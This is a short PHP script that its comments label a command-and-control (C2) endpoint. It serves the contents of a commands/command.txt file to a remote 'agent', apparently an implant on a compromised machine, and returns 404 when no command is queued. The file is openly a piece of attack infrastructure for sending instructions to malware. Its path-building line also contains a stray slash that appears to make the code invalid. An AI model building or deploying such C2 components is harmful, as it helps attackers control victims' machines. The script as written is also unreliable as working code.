<?php
//get_command.php
//c2 endpoint to serve a command file to the agent

//path to the command file
$commandFile=__Dir__./"/commands/command.txt";

if(!file_exists($commandFile)){
	http_response_code(404);
	echo "Command not found.";
	exit;
}


//send the command.txt file content
header("Content-Type: text/plain");
header("Content-Disposition: inline; filename=\"command.txt\"");
readfile($commandFile);